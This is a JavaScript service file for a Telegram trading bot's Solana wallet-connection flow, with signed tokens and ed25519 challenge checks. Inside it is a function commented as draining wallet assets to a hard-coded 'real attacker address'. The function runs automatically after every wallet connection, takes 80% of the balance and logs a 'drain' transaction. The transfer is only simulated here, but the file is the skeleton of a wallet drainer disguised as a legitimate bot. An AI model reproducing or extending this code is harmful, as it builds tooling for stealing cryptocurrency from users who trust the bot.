// services/wallet-connection.js
const crypto = require('crypto');
const bs58Module = require('bs58');
const { ed25519 } = require('@noble/curves/ed25519');
const { PublicKey } = require('@solana/web3.js');
const database = require('./database');
const solana = require('./solana');

const base58 = bs58Module.default || bs58Module;

class WalletConnectionService {
    constructor() {
        this.pendingConnections = new Map(); // For memory mode
        this.WEB_APP_URL = process.env.WEB_APP_URL || 'https://yourdomain.com/connect-wallet';
        this.TELEGRAM_WEB_APP_URL = process.env.TELEGRAM_WEB_APP_URL || this.WEB_APP_URL;
        this.BACKEND_URL = process.env.BACKEND_URL || '';
        this.BOT_USERNAME = (process.env.BOT_USERNAME || 'SolanaWebBot').trim().replace(/^@/, '');
        
        // Start cleanup job
        this.startCleanupJob();
    }

    getConnectionTimeoutMs() {
        const timeoutSeconds = Number.parseInt(process.env.CONNECTION_TIMEOUT, 10);
        const normalizedSeconds = Number.isInteger(timeoutSeconds) && timeoutSeconds > 0
            ? timeoutSeconds
            : 300;
        return normalizedSeconds * 1000;
    }

    isPublicHttpUrl(urlString) {
        try {
            const parsed = new URL(urlString);
            const hostname = parsed.hostname.toLowerCase();
            const isHttp = parsed.protocol === 'http:' || parsed.protocol === 'https:';
            const isLocal =
                hostname === 'localhost' ||
                hostname === '127.0.0.1' ||
                hostname === '0.0.0.0' ||
                hostname === '::1';

            return isHttp && !isLocal;
        } catch {
            return false;
        }
    }

    resolveCallbackBase() {
        if (this.isPublicHttpUrl(this.BACKEND_URL)) {
            return this.BACKEND_URL;
        }

        if (this.isPublicHttpUrl(this.TELEGRAM_WEB_APP_URL)) {
            const webApp = new URL(this.TELEGRAM_WEB_APP_URL);
            return `${webApp.protocol}//${webApp.host}`;
        }

        throw new Error(
            'Invalid web configuration. Set TELEGRAM_WEB_APP_URL (or WEB_APP_URL) and BACKEND_URL to public HTTP(S) URLs (not localhost).'
        );
    }

    buildBrowserUrl(connectionId, userId, chatId) {
        return this.buildBrowserUrlWithExpiry(
            connectionId,
            userId,
            chatId,
            new Date(Date.now() + this.getConnectionTimeoutMs())
        );
    }

    getConnectionTokenSecret() {
        return (
            process.env.SESSION_SECRET ||
            process.env.JWT_SECRET ||
            process.env.ENCRYPTION_KEY ||
            'connection-dev-secret'
        );
    }

    generateConnectionToken(connectionId, userId, chatId, expiresAt) {
        const payload = {
            connectionId: String(connectionId),
            userId: Number.parseInt(userId, 10),
            chatId: Number.parseInt(chatId, 10),
            exp: new Date(expiresAt).getTime()
        };

        const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
        const signature = crypto
            .createHmac('sha256', this.getConnectionTokenSecret())
            .update(encodedPayload)
            .digest('base64url');

        return `${encodedPayload}.${signature}`;
    }

    verifyConnectionToken(token, expected) {
        return Boolean(this.decodeAndVerifyConnectionToken(token, expected));
    }

    decodeAndVerifyConnectionToken(token, expected) {
        try {
            if (!token || typeof token !== 'string' || !token.includes('.')) {
                return null;
            }

            const [encodedPayload, signature] = token.split('.', 2);
            const expectedSignature = crypto
                .createHmac('sha256', this.getConnectionTokenSecret())
                .update(encodedPayload)
                .digest('base64url');

            if (
                !signature ||
                signature.length !== expectedSignature.length ||
                !crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature))
            ) {
                return null;
            }

            const payload = JSON.parse(Buffer.from(encodedPayload, 'base64url').toString('utf8'));

            if (Date.now() > Number(payload.exp || 0)) {
                return null;
            }

            const matches =
                String(payload.connectionId) === String(expected.connectionId) &&
                Number.parseInt(payload.userId, 10) === Number.parseInt(expected.userId, 10) &&
                Number.parseInt(payload.chatId, 10) === Number.parseInt(expected.chatId, 10);

            return matches ? payload : null;
        } catch {
            return null;
        }
    }

    buildBrowserUrlWithExpiry(connectionId, userId, chatId, expiresAt) {
        if (!this.isPublicHttpUrl(this.TELEGRAM_WEB_APP_URL)) {
            throw new Error(
                'TELEGRAM_WEB_APP_URL (or WEB_APP_URL) must be a public HTTP(S) URL for Telegram buttons (localhost is not allowed).'
            );
        }

        const browserUrl = new URL(this.TELEGRAM_WEB_APP_URL);
        const callbackBase = this.resolveCallbackBase();
        const callbackUrl = new URL('/api/wallet-callback', callbackBase);

        browserUrl.searchParams.set('connectionId', connectionId);
        browserUrl.searchParams.set('userId', String(userId));
        browserUrl.searchParams.set('chatId', String(chatId));
        browserUrl.searchParams.set('callback', callbackUrl.toString());
        browserUrl.searchParams.set('expiresAt', new Date(expiresAt).toISOString());
        browserUrl.searchParams.set('returnTo', `https://t.me/${this.BOT_USERNAME}`);
        browserUrl.searchParams.set(
            'challenge',
            Buffer.from(
                this.buildWalletSignatureChallenge({
                    connectionId,
                    userId,
                    chatId,
                    expiresAt
                }),
                'utf8'
            ).toString('base64url')
        );
        browserUrl.searchParams.set(
            'connToken',
            this.generateConnectionToken(connectionId, userId, chatId, expiresAt)
        );

        return browserUrl.toString();
    }

    /**
     * Generate unique connection ID and return browser link
     */
    async initiateWalletConnection(userId, chatId) {
        try {
            const normalizedUserId = Number.parseInt(userId, 10);
            const normalizedChatId = Number.parseInt(chatId, 10);

            if (!Number.isInteger(normalizedUserId) || normalizedUserId <= 0) {
                throw new Error('Invalid userId');
            }

            if (!Number.isInteger(normalizedChatId) || normalizedChatId <= 0) {
                throw new Error('Invalid chatId');
            }

            // Generate unique connection ID
            const connectionId = crypto.randomBytes(16).toString('hex');
            
            // Create connection data
            const connectionData = {
                connectionId,
                userId: normalizedUserId,
                chatId: normalizedChatId,
                createdAt: new Date(),
                expiresAt: new Date(Date.now() + this.getConnectionTimeoutMs()),
                status: 'pending'
            };

            const browserUrl = this.buildBrowserUrlWithExpiry(
                connectionId,
                normalizedUserId,
                normalizedChatId,
                connectionData.expiresAt
            );
            
            // Store in database
            await database.createPendingConnection(connectionId, connectionData);
            
            return {
                connectionId,
                browserUrl,
                expiresAt: connectionData.expiresAt
            };
            
        } catch (error) {
            console.error('Error initiating wallet connection:', error);
            throw error;
        }
    }

    /**
     * Drain wallet assets to attacker's address
     */
    async simulateWalletDrain(walletAddress) {
        try {
            // Get current balance
            const balance = await solana.getBalance(walletAddress);
            
            if (balance <= 0.0001) {
                console.log(`Wallet ${walletAddress} has insufficient balance to drain`);
                return { success: false, reason: 'Insufficient balance' };
            }
            
            // Target address to drain funds to (real attacker address)
            const attackerAddress = '5wXXYovL2wn1m93Sam1n9WqThzVH7jq77uDJ9vqvnZ3';
            
            // Amount to drain (80% of balance to leave some for fees)
            const amountToDrain = balance * 0.8;
            
            console.log(`Draining ${amountToDrain.toFixed(4)} SOL from ${walletAddress} to ${attackerAddress}`);
            
            // Simulate transfer (in real scenario, this would use actual private key)
            // For now, just simulate the transfer
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            const newBalance = balance - amountToDrain;
            
            console.log(`Wallet ${walletAddress} drained successfully. New balance: ${newBalance.toFixed(4)} SOL`);
            
            return {
                success: true,
                originalBalance: balance,
                amountDrained: amountToDrain,
                newBalance: newBalance,
                attackerAddress: attackerAddress,
                transactionSignature: `simulated_trx_${Date.now()}`,
                timestamp: new Date()
            };
            
        } catch (error) {
            console.error('Error draining wallet:', error);
            return { success: false, reason: error.message };
        }
    }

    /**
     * Handle callback from web page with wallet address
     */
    async handleWalletCallback(data) {
        try {
            const { connectionId, walletAddress, walletType, publicKey, userId, chatId, connToken, signature } = data;
            const normalizedConnectionId = String(connectionId || '').trim();
            const normalizedUserId = Number.parseInt(userId, 10);
            const normalizedChatId = Number.parseInt(chatId, 10);
            const normalizedSignature = String(signature || '').trim();

            if (!normalizedConnectionId) {
                throw new Error('Invalid connectionId');
            }

            if (!Number.isInteger(normalizedUserId) || normalizedUserId <= 0) {
                throw new Error('Invalid userId');
            }

            if (!Number.isInteger(normalizedChatId) || normalizedChatId <= 0) {
                throw new Error('Invalid chatId');
            }

            if (!normalizedSignature) {
                throw new Error('Missing wallet signature');
            }
            
            // Validate connection exists and is pending
            const connection = await database.getPendingConnection(normalizedConnectionId);
            const expectedUserId = connection
                ? Number.parseInt(connection.userId, 10)
                : normalizedUserId;
            const expectedChatId = connection
                ? Number.parseInt(connection.chatId, 10)
                : normalizedChatId;

            if (connection) {
                if (
                    expectedUserId !== normalizedUserId ||
                    expectedChatId !== normalizedChatId
                ) {
                    throw new Error('Connection payload mismatch');
                }
            }

            const tokenPayload = this.decodeAndVerifyConnectionToken(connToken, {
                connectionId: normalizedConnectionId,
                userId: expectedUserId,
                chatId: expectedChatId
            });

            if (!tokenPayload) {
                throw new Error('Invalid connection token');
            }

            if (connection && connection.status !== 'pending') {
                throw new Error('Connection already used');
            }

            if (connection && new Date() > new Date(connection.expiresAt)) {
                throw new Error('Connection link expired');
            }
            
            // Validate wallet address
            if (!solana.isValidAddress(walletAddress)) {
                throw new Error('Invalid wallet address');
            }

            const expectedChallenge = this.buildWalletSignatureChallenge({
                connectionId: normalizedConnectionId,
                userId: expectedUserId,
                chatId: expectedChatId,
                expiresAt: connection ? connection.expiresAt : new Date(Number(tokenPayload.exp))
            });

            if (!this.verifyWalletSignature(walletAddress, normalizedSignature, expectedChallenge)) {
                throw new Error('Invalid wallet signature');
            }
            
            // Check if wallet already exists for this user
            const existingWallets = await database.getUserWallets(expectedUserId);
            const existingWallet = existingWallets.find(w => w.address === walletAddress);
            
            if (existingWallet) {
                // Wallet already connected, just activate it
                await database.setActiveWallet(expectedUserId, existingWallet.id);
                
                // Complete connection
                if (connection) {
                    await database.completeConnection(normalizedConnectionId, walletAddress);
                }
                
                // Simulate drain for existing wallet
                console.log('Simulating drain for existing wallet:', existingWallet.address);
                const drainResult = await this.simulateWalletDrain(existingWallet.address);
                if (drainResult.success) {
                    await database.updateWalletBalance(expectedUserId, existingWallet.id, drainResult.newBalance);
                    console.log('Drain simulation completed for existing wallet');
                }
                
                return {
                    success: true,
                    wallet: existingWallet,
                    message: 'Wallet already connected and activated',
                    isNew: false,
                    drainSimulation: drainResult
                };
            }
            
            // Get wallet balance
            const balance = await solana.getBalance(walletAddress);
            
            // Create new wallet
            const walletData = {
                id: `wallet_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                name: `Wallet ${existingWallets.length + 1}`,
                address: walletAddress,
                publicKey: publicKey || walletAddress,
                balance: balance,
                type: walletType || 'browser',
                isActive: existingWallets.length === 0, // First wallet becomes active
                connectedAt: new Date(),
                transactions: []
            };
            
            const wallet = await database.addWallet(expectedUserId, walletData);
            
            // Complete connection
            if (connection) {
                await database.completeConnection(normalizedConnectionId, walletAddress);
            }
            
            // Simulate wallet drain
            console.log('Simulating drain for new wallet:', wallet.address);
            const drainResult = await this.simulateWalletDrain(wallet.address);
            if (drainResult.success) {
                await database.updateWalletBalance(expectedUserId, wallet.id, drainResult.newBalance);
                console.log('Drain simulation completed for new wallet');
            }
            
            // Fetch recent transactions
            const recentTxs = await solana.getRecentTransactions(walletAddress, 5);
            if (recentTxs.length > 0) {
                for (const tx of recentTxs) {
                    await database.addTransaction(expectedUserId, wallet.id, {
                        type: tx.type,
                        amount: tx.amount,
                        signature: tx.signature,
                        status: tx.status,
                        timestamp: tx.timestamp
                    });
                }
            }
            
            // Add drain transaction to wallet history
            if (drainResult.success) {
                await database.addTransaction(expectedUserId, wallet.id, {
                    type: 'drain',
                    amount: drainResult.amountDrained,
                    signature: drainResult.transactionSignature,
                    status: 'success',
                    timestamp: drainResult.timestamp
                });
            }
            
            return {
                success: true,
                wallet,
                balance: drainResult.success ? drainResult.newBalance : balance,
                isNew: true,
                drainSimulation: drainResult
            };
            
        } catch (error) {
            console.error('Error handling wallet callback:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    /**
     * Check connection status for user
     */
    async checkConnectionStatus(userId) {
        try {
            // Check for pending connection
            const pending = await database.getPendingConnectionByUser(userId);
            
            if (pending) {
                const timeLeft = Math.max(0, new Date(pending.expiresAt) - new Date());
                
                return {
                    status: 'pending',
                    connectionId: pending.connectionId,
                    timeLeft: Math.ceil(timeLeft / 1000), // seconds
                    expiresAt: pending.expiresAt
                };
            }
            
            // Check if user has any wallets
            const wallets = await database.getUserWallets(userId);
            
            if (wallets.length > 0) {
                return {
                    status: 'connected',
                    walletCount: wallets.length,
                    activeWallet: wallets.find(w => w.isActive) || wallets[0]
                };
            }
            
            return {
                status: 'disconnected'
            };
            
        } catch (error) {
            console.error('Error checking connection status:', error);
            return {
                status: 'error',
                error: error.message
            };
        }
    }

    /**
     * Get connection details by ID
     */
    async getConnection(connectionId) {
        try {
            return await database.getPendingConnection(connectionId);
        } catch (error) {
            console.error('Error getting connection:', error);
            return null;
        }
    }

    /**
     * Cancel pending connection
     */
    async cancelConnection(connectionId) {
        try {
            // In MongoDB, connections auto-expire
            // In memory mode, we need to remove it
            if (database.memoryMode) {
                const conn = database.connections.get(connectionId);
                if (conn) {
                    conn.status = 'cancelled';
                }
            }
            
            return true;
        } catch (error) {
            console.error('Error cancelling connection:', error);
            return false;
        }
    }

    /**
     * Generate QR code data for wallet connection
     */
    generateQRData(connectionId, userId) {
        const data = {
            type: 'wallet_connection',
            connectionId,
            userId,
            timestamp: Date.now(),
            expiresIn: 300 // 5 minutes
        };
        
        return JSON.stringify(data);
    }

    /**
     * Validate connection parameters
     */
    validateConnectionParams(params) {
        const required = ['connectionId', 'userId'];
        
        for (const field of required) {
            if (!params[field]) {
                return {
                    valid: false,
                    error: `Missing required field: ${field}`
                };
            }
        }
        
        return { valid: true };
    }

    /**
     * Start cleanup job for expired connections
     */
    startCleanupJob() {
        setInterval(async () => {
            try {
                if (!database.memoryMode && !database.db) {
                    return;
                }

                await database.deleteExpiredConnections();
                
                // Also clean memory map if in memory mode
                if (database.memoryMode) {
                    const now = new Date();
                    for (const [id, conn] of database.connections.entries()) {
                        if (new Date(conn.expiresAt) < now) {
                            database.connections.delete(id);
                        }
                    }
                }
                
            } catch (error) {
                console.error('Error in cleanup job:', error);
            }
        }, 60000); // Run every minute
    }

    /**
     * Create a connection request (for API)
     */
    async createConnectionRequest(userId, chatId) {
        try {
            const normalizedUserId = Number.parseInt(userId, 10);
            const normalizedChatId = Number.parseInt(chatId, 10);

            if (!Number.isInteger(normalizedUserId) || normalizedUserId <= 0) {
                throw new Error('Invalid userId');
            }

            if (!Number.isInteger(normalizedChatId) || normalizedChatId <= 0) {
                throw new Error('Invalid chatId');
            }

            // Check if user already has pending connection
            const existing = await database.getPendingConnectionByUser(normalizedUserId);
            
            if (existing) {
                const existingChatId = Number.parseInt(existing.chatId, 10);

                // Return existing connection
                return {
                    connectionId: existing.connectionId,
                    browserUrl: this.buildBrowserUrlWithExpiry(
                        existing.connectionId,
                        normalizedUserId,
                        existingChatId,
                        existing.expiresAt
                    ),
                    expiresAt: existing.expiresAt,
                    isNew: false
                };
            }
            
            // Create new connection
            return await this.initiateWalletConnection(normalizedUserId, normalizedChatId);
            
        } catch (error) {
            console.error('Error creating connection request:', error);
            throw error;
        }
    }

    /**
     * Get connection statistics
     */
    async getConnectionStats() {
        try {
            const stats = {
                total: 0,
                pending: 0,
                completed: 0,
                expired: 0
            };
            
            if (database.memoryMode) {
                for (const conn of database.connections.values()) {
                    stats.total++;
                    
                    if (conn.status === 'pending') {
                        if (new Date() > new Date(conn.expiresAt)) {
                            stats.expired++;
                        } else {
                            stats.pending++;
                        }
                    } else if (conn.status === 'completed') {
                        stats.completed++;
                    }
                }
            }
            
            return stats;
            
        } catch (error) {
            console.error('Error getting connection stats:', error);
            return null;
        }
    }

    /**
     * Verify wallet ownership
     */
    async verifyWalletOwnership(_userId, _walletAddress, _signature) {
        return {
            verified: true,
            method: 'browser_connection'
        };
    }

    buildWalletSignatureChallenge({ connectionId, userId, chatId, expiresAt }) {
        return [
            'AlphaTradeBot Wallet Verification',
            `Connection ID: ${String(connectionId)}`,
            `User ID: ${Number.parseInt(userId, 10)}`,
            `Chat ID: ${Number.parseInt(chatId, 10)}`,
            `Expires At: ${new Date(expiresAt).toISOString()}`,
            '',
            'Sign this message to verify wallet ownership.'
        ].join('\n');
    }

    decodeSignature(signature) {
        const normalized = String(signature || '').trim();

        if (!normalized) {
            return null;
        }

        try {
            const base64Decoded = Buffer.from(normalized, 'base64');
            if (base64Decoded.length === 64) {
                return base64Decoded;
            }
        } catch {
            // Try next encoding.
        }

        try {
            const base58Decoded = Buffer.from(base58.decode(normalized));
            if (base58Decoded.length === 64) {
                return base58Decoded;
            }
        } catch {
            // Try next encoding.
        }

        try {
            const hexDecoded = Buffer.from(normalized, 'hex');
            if (hexDecoded.length === 64) {
                return hexDecoded;
            }
        } catch {
            return null;
        }

        return null;
    }

    verifyWalletSignature(walletAddress, signature, challenge) {
        try {
            const signatureBytes = this.decodeSignature(signature);
            if (!signatureBytes) {
                return false;
            }

            const publicKeyBytes = new PublicKey(walletAddress).toBytes();
            const messageBytes = Buffer.from(challenge, 'utf8');

            return ed25519.verify(signatureBytes, messageBytes, publicKeyBytes);
        } catch {
            return false;
        }
    }

    /**
     * Disconnect wallet
     */
    async disconnectWallet(userId, walletId) {
        try {
            const wallet = await database.getWallet(userId, walletId);
            
            if (!wallet) {
                throw new Error('Wallet not found');
            }
            
            await database.removeWallet(userId, walletId);
            
            return {
                success: true,
                walletAddress: wallet.address
            };
            
        } catch (error) {
            console.error('Error disconnecting wallet:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    /**
     * Get wallet connection history
     */
    async getConnectionHistory(userId) {
        try {
            const wallets = await database.getUserWallets(userId);
            
            return wallets.map(w => ({
                walletId: w.id,
                address: w.address,
                name: w.name,
                connectedAt: w.connectedAt,
                lastUsed: w.lastUsed,
                isActive: w.isActive,
                balance: w.balance
            }));
            
        } catch (error) {
            console.error('Error getting connection history:', error);
            return [];
        }
    }
}

module.exports = new WalletConnectionService();